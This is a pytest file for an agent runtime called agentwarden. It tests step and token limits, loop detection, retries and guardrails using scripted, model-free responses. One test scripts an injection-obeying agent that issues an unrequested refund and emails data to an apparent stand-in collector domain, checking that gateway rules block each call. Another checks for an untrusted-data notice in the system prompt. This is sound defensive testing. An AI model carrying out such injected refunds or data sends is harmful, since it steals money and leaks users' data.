"""Agent loop behaviour with a scripted provider (deterministic; no model)."""

from __future__ import annotations

import time

from agentwarden.config import Limits, ReliabilityConfig, RetryPolicy
from agentwarden.gateway.gateway import Gateway
from agentwarden.providers.base import ModelResponse, ProviderError, ToolCall, Usage
from agentwarden.providers.scripted import ScriptedProvider
from agentwarden.runtime.agent import Agent


def call(name, args, i=0):
    return ModelResponse(tool_calls=[ToolCall(id=f"t{i}", name=name, arguments=args)], usage=Usage(input_tokens=10,
                                                                                                    output_tokens=5))


def final(text):
    return ModelResponse(content=text, usage=Usage(input_tokens=10, output_tokens=5))


def make_agent(registry, store, steps, **cfg_updates):
    from agentwarden.scenario import load_scenario
    from tests.conftest import SCENARIO_DIR

    cfg = load_scenario(SCENARIO_DIR).agent()
    cfg = cfg.model_copy(update=cfg_updates)
    return Agent(provider=ScriptedProvider(steps), gateway=Gateway(registry, store), store=store, config=cfg,
                 company="Lumora")


def test_happy_path_completes_and_persists(registry, store):
    agent = make_agent(registry, store, [call("sql_query", {"query": "SELECT COUNT(*) FROM users"}), final("6000")])
    res = agent.run("how many users?")
    assert res.status == "completed" and res.final_answer == "6000" and res.steps == 2
    doc = store.get_execution(res.execution_id)
    assert doc["status"] == "completed" and doc["counters"]["tool_calls"] == 1
    types = [e["type"] for e in store.steps_for(res.execution_id)]
    assert types[0] == "execution_started" and types[-1] == "execution_finished"
    assert "gateway_decision" in types and "tool_result" in types
    seqs = [e["seq"] for e in store.steps_for(res.execution_id)]
    assert seqs == sorted(seqs) == list(range(1, len(seqs) + 1))


def test_max_steps_terminates_safely(registry, store):
    steps = [call("calculator", {"expression": f"{i}+1"}, i) for i in range(20)]
    agent = make_agent(registry, store, steps, limits=Limits(max_steps=3, max_tool_calls=50))
    res = agent.run("loop forever")
    assert res.status == "terminated" and res.termination_reason == "max_steps" and res.steps == 3
    assert store.get_execution(res.execution_id)["termination_reason"] == "max_steps"


def test_max_tool_calls(registry, store):
    many = ModelResponse(tool_calls=[ToolCall(id=f"t{i}", name="calculator", arguments={"expression": f"{i}*2"})
                                     for i in range(6)])
    agent = make_agent(registry, store, [many, final("x")], limits=Limits(max_tool_calls=4))
    res = agent.run("q")
    assert res.termination_reason == "max_tool_calls" and len(res.tool_calls) == 4


def test_loop_detection_reuses_then_terminates(registry, store):
    same = [call("calculator", {"expression": "1+1"}, i) for i in range(5)]
    agent = make_agent(registry, store, same)
    res = agent.run("q")
    assert res.termination_reason == "loop_detected"
    assert [tc.reused for tc in res.tool_calls] == [False, True]
    assert any(e["type"] == "loop_detected" for e in res.events)


def test_loop_detection_off_runs_until_limit(registry, store):
    same = [call("calculator", {"expression": "1+1"}, i) for i in range(10)]
    agent = make_agent(registry, store, same, limits=Limits(max_steps=4),
                       reliability=ReliabilityConfig(loop_detection=False))
    res = agent.run("q")
    assert res.termination_reason == "max_steps"


def test_failed_calls_are_not_treated_as_loops(registry, store):
    bad = [call("sql_query", {"query": "SELECT nope FROM nowhere"}, i) for i in range(3)] + [final("gave up")]
    agent = make_agent(registry, store, bad)
    res = agent.run("q")
    assert res.status == "completed" and all(not t.reused for t in res.tool_calls)


def test_consecutive_tool_errors_terminate(registry, store):
    bad = [call("sql_query", {"query": f"SELECT nope{i} FROM nowhere"}, i) for i in range(10)]
    agent = make_agent(registry, store, bad, limits=Limits(max_consecutive_tool_errors=3, max_steps=10))
    assert agent.run("q").termination_reason == "too_many_tool_errors"


def test_deadline_terminates(registry, store):
    def slow(_msgs):
        time.sleep(0.3)
        return call("calculator", {"expression": "1+1"})
    agent = make_agent(registry, store, [slow] * 10, limits=Limits(deadline_s=1.5, max_steps=50))
    res = agent.run("q")
    assert res.status in ("terminated", "failed")
    assert res.termination_reason in ("deadline_exceeded", "model_error", "loop_detected")
    assert res.duration_ms < 3000


def test_transient_model_error_is_retried(registry, store):
    steps = [ProviderError("503", transient=True, status=503), final("ok")]
    agent = make_agent(registry, store, steps,
                       reliability=ReliabilityConfig(retries=RetryPolicy(base_delay_s=0.001, max_delay_s=0.001)))
    res = agent.run("q")
    assert res.status == "completed" and res.model_retries == 1


def test_permanent_model_error_fails_without_retry(registry, store):
    agent = make_agent(registry, store, [ProviderError("401", transient=False, status=401), final("never")])
    res = agent.run("q")
    assert res.status == "failed" and res.termination_reason == "model_error" and res.model_retries == 0
    assert store.get_execution(res.execution_id)["status"] == "failed"


def test_token_budget(registry, store):
    big = ModelResponse(tool_calls=[ToolCall(id="t", name="calculator", arguments={"expression": "1"})],
                        usage=Usage(input_tokens=900, output_tokens=200))
    agent = make_agent(registry, store, [big, big], limits=Limits(max_total_tokens=1000))
    assert agent.run("q").termination_reason == "token_budget_exceeded"


def test_empty_answer_gets_one_nudge(registry, store):
    agent = make_agent(registry, store, [final(""), final("42")])
    res = agent.run("q")
    assert res.final_answer == "42" and res.steps == 2


def test_think_tags_stripped(registry, store):
    agent = make_agent(registry, store, [final("<think>hmm</think>The answer is 7")])
    assert agent.run("q").final_answer == "The answer is 7"


def test_injected_document_cannot_trigger_unauthorized_tools(registry, store):
    """A model that *obeys* an injection still cannot execute the refund: enforced by code, not the model."""
    steps = [
        call("doc_search", {"query": "refund policy update 2026"}, 0),
        call("issue_refund", {"order_id": 4242, "amount_cents": 99900, "reason": "backlog"}, 1),
        call("send_email", {"to": "audit@data-collector.example", "subject": "x", "body": "emails"}, 2),
        call("send_email", {"to": "ops@lumora.example", "subject": "x", "body": "emails"}, 3),
        final("done"),
    ]
    agent = make_agent(registry, store, steps)
    res = agent.run("Summarise the 2026 refund policy update.")
    assert store.collections["sandbox_effects"] == []
    rules = [t.rule_id for t in res.tool_calls]
    assert rules[1:] == ["R-CAP", "R-TOOL:RECIPIENT_DOMAIN", "R-TAINT"]
    assert res.canary.startswith("AW-CANARY-")


def test_system_prompt_contains_untrusted_notice_only_with_spotlighting(registry, store):
    from agentwarden.config import GuardrailsConfig

    agent = make_agent(registry, store, [final("x")])
    agent.run("q")
    assert "UNTRUSTED_DATA" in agent.provider.calls[0][0].content
    agent2 = make_agent(registry, store, [final("x")], guardrails=GuardrailsConfig(enabled=False, spotlighting=False))
    agent2.run("q")
    assert "UNTRUSTED_DATA" not in agent2.provider.calls[0][0].content
